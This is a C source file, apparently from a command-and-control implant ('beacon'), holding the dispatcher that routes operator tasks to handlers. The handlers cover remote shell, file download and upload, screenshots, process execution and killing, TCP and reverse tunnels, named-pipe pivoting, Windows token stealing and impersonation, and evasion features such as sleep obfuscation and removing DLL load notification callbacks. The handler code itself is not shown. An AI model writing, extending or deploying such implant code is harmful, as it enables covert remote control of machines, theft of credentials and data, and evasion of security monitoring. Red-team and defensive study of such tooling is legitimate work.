/* beacon/src/Commands/Dispatch.c
 * NaxDispatch - execute one decoded task, write result into caller buffers.
 *
 * To add a new command:
 *   1. Define NAX_CMD_YOURNAME in Wire.h
 *   2. Implement NaxCmdYourName() in Commands/YourName.c
 *   3. Add the case here and to the forward declarations below. */

#include "Nax.h"
#include "Transport.h"

/* ========= [ dispatcher ] ========= */

FUNC INT NaxDispatch( PNAX_INSTANCE    Nax,
                      const NAX_TASK*  task,
                      UINT32*          result_task_id,
                      BYTE*            result_status,
                      PBYTE            result_data,
                      UINT32*          result_data_len ) {

    *result_task_id  = task->TaskId;
    /* *result_data_len is the caller's buffer capacity - leave it as-is. */

    switch ( task->CmdId ) {

    /* ---- CMD_WHOAMI (0x10) ---- */
    case NAX_CMD_WHOAMI:
        *result_status = ( NaxCmdWhoami( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        if ( *result_status != NAX_STATUS_OK ) *result_data_len = 0;
        return 1;

    /* ---- CMD_SLEEP (0x11) ---- */
    case NAX_CMD_SLEEP:
        *result_status = ( NaxCmdSleep( Nax, task->Args, (UINT32)task->ArgsLen,
                                         result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        if ( *result_status != NAX_STATUS_OK ) *result_data_len = 0;
        return 1;

    /* ---- CMD_EXIT_THREAD (0x12) ---- */
    case NAX_CMD_EXIT_THREAD:
        Nax->Ntdll.RtlExitUserThread( 0 );
        return 0;

    /* ---- CMD_EXIT_PROCESS (0x13) ---- */
    case NAX_CMD_EXIT_PROCESS:
        Nax->Kernel32.ExitProcess( 0 );
        return 0;

    /* ---- CMD_CD (0x14) ---- */
    case NAX_CMD_CD:
        *result_status = ( CmdCd( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_PWD (0x15) ---- */
    case NAX_CMD_PWD:
        *result_status = ( CmdPwd( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_MKDIR (0x16) ---- */
    case NAX_CMD_MKDIR:
        *result_status = ( CmdMkdir( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_RMDIR (0x17) ---- */
    case NAX_CMD_RMDIR:
        *result_status = ( CmdRmdir( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_CAT (0x18) ---- */
    case NAX_CMD_CAT:
        *result_status = ( CmdCat( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_LS (0x19) ---- */
    case NAX_CMD_LS:
        *result_status = ( CmdLs( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_BOF (0x20) ---- */
    case NAX_CMD_BOF: {
        INT bof_rc = NaxCmdBof( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
        if ( bof_rc == NAX_STATUS_ASYNC ) {
            *result_status = NAX_STATUS_ASYNC;
            *result_data_len = 0;
        } else {
            *result_status = ( bof_rc == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR;
        }
        return 1;
    }

    /* ---- CMD_SCREENSHOT (0x21) - GDI desktop capture ---- */
    case NAX_CMD_SCREENSHOT:
        *result_status = ( NaxCmdScreenshot( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        if ( *result_status != NAX_STATUS_OK ) *result_data_len = 0;
        return 1;

    /* ---- CMD_DOWNLOAD (0x22) - initiate chunked file download ---- */
    case NAX_CMD_DOWNLOAD:
        *result_status = ( NaxCmdDownload( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_PS_LIST (0x23) ---- */
    case NAX_CMD_PS_LIST:
        *result_status = ( CmdPsList( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_PS_KILL (0x24) ---- */
    case NAX_CMD_PS_KILL:
        *result_status = ( CmdPsKill( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_PS_RUN (0x25) ---- */
    case NAX_CMD_PS_RUN:
        *result_status = ( CmdPsRun( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_RM (0x27) - delete a file ---- */
    case NAX_CMD_RM:
        *result_status = ( CmdRm( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_CHUNKSIZE (0x2B) - set download chunk size ---- */
    case NAX_CMD_CHUNKSIZE:
        if ( task->ArgsLen >= 4 ) {
            UINT32 newSz = NaxR32( task->Args );
            if ( newSz > NAX_DL_CHUNK_MAX ) newSz = NAX_DL_CHUNK_MAX;
            if ( newSz < 4096 )             newSz = 4096;
            Nax->Config.DlChunkSize = newSz;
            NaxW32( result_data, newSz );
            *result_data_len = 4;
            *result_status   = NAX_STATUS_OK;
        } else {
            *result_status   = NAX_STATUS_ERR;
            *result_data_len = 0;
        }
        return 1;

    /* ---- CMD_UPLOAD (0x26) - write accumulated MemSave data to disk ---- */
    case NAX_CMD_UPLOAD:
        *result_status = ( NaxCmdUpload( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_SAVEMEMORY (0x2A) - accumulate upload chunk ---- */
    case NAX_CMD_SAVEMEMORY:
        *result_status = ( NaxCmdSaveMemory( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_WATCHDOG_SET (0x2C) ---- */
    case NAX_CMD_WATCHDOG_SET:
        *result_status = ( NaxCmdWatchdogSet( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_PIVOT_EXEC (0x37) - write data to linked child ---- */
    case NAX_CMD_PIVOT_EXEC:
        CmdPivotExec( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
        return 0;  /* no result frame - server already knows */

    /* ---- CMD_LINK (0x38) - connect to child's named pipe ---- */
    case NAX_CMD_LINK:
        *result_status = ( CmdLink( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_UNLINK (0x39) - disconnect a linked child ---- */
    case NAX_CMD_UNLINK:
        *result_status = ( CmdUnlink( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
    /* ---- CMD_PROFILE (0x30) - runtime profile update ---- */
    case NAX_CMD_PROFILE:
        CmdProfile( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
        *result_status = result_data[0];
        *result_data_len = 0;
        return 1;
#endif

    /* ---- CMD_BOF_STOMP (0x31) - runtime BOF stomp reconfiguration ---- */
    case NAX_CMD_BOF_STOMP:
        *result_status = ( NaxCmdBofStomp( Nax, task->Args, (UINT32)task->ArgsLen,
                                            result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_DLL_NOTIFY_LIST (0x3A) - enumerate DLL load notification callbacks ---- */
    case NAX_CMD_DLL_NOTIFY_LIST:
        *result_status = ( NaxCmdDllNotifyList( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_DLL_NOTIFY_REMOVE (0x3B) - remove all DLL load notification callbacks ---- */
    case NAX_CMD_DLL_NOTIFY_REMOVE:
        *result_status = ( NaxCmdDllNotifyRemove( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_SLEEPMASK_SET (0x32) - load sleepmask BOF persistently ---- */
    case NAX_CMD_SLEEPMASK_SET:
        *result_status = ( NaxCmdSleepmaskSet( Nax, task->Args, (UINT32)task->ArgsLen,
                                                result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_SLEEPOBF_CONFIG (0x33) - runtime sleep obfuscation toggle ---- */
    case NAX_CMD_SLEEPOBF_CONFIG:
        *result_status = ( NaxCmdSleepObfConfig( Nax, task->Args, (UINT32)task->ArgsLen,
                                                  result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_JOB_LIST (0x28) ---- */
    case NAX_CMD_JOB_LIST:
        *result_status = ( NaxJobList( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- CMD_JOB_KILL (0x29) ---- */
    case NAX_CMD_JOB_KILL:
        if ( task->ArgsLen >= 4 ) {
            UINT32 killTaskId = NaxR32( task->Args );
            *result_status = ( NaxJobKill( Nax, killTaskId ) == NAX_OK )
                                 ? NAX_STATUS_OK : NAX_STATUS_ERR;
        } else {
            *result_status = NAX_STATUS_ERR;
        }
        *result_data_len = 0;
        return 1;

    /* ---- shell commands (0x47–0x49) ---- */
    case NAX_CMD_SHELL_START:
    case NAX_CMD_SHELL_WRITE:
    case NAX_CMD_SHELL_CLOSE:
        NaxShellDispatch( Nax, task->TaskId, task->CmdId, task->Args, (UINT32)task->ArgsLen );
        return 0;

    /* ---- tunnel commands (0x3E–0x46) ---- */
    case NAX_CMD_TUNNEL_CONNECT_TCP:
    case NAX_CMD_TUNNEL_WRITE_TCP:
    case NAX_CMD_TUNNEL_CLOSE:
    case NAX_CMD_TUNNEL_REVERSE:
    case NAX_CMD_TUNNEL_PAUSE:
    case NAX_CMD_TUNNEL_RESUME:
        NaxTunnelDispatch( Nax, task->CmdId, task->Args, (UINT32)task->ArgsLen );
        return 0;

    /* ---- token commands (0x50–0x57) ---- */
    case NAX_CMD_TOKEN_GETUID:
        *result_status = ( CmdTokenGetUid( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_STEAL:
        *result_status = ( CmdTokenSteal( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_USE:
        *result_status = ( CmdTokenUse( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_LIST:
        *result_status = ( CmdTokenList( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_RM:
        *result_status = ( CmdTokenRm( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_REVERT:
        *result_status = ( CmdTokenRevert( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_MAKE:
        *result_status = ( CmdTokenMake( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    case NAX_CMD_TOKEN_PRIVS:
        *result_status = ( CmdTokenPrivs( Nax, result_data, result_data_len ) == NAX_OK )
                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
        return 1;

    /* ---- unrecognised command ---- */
    default:
        *result_status   = NAX_STATUS_ERR;
        *result_data_len = 0;
        return 1;
    }
}
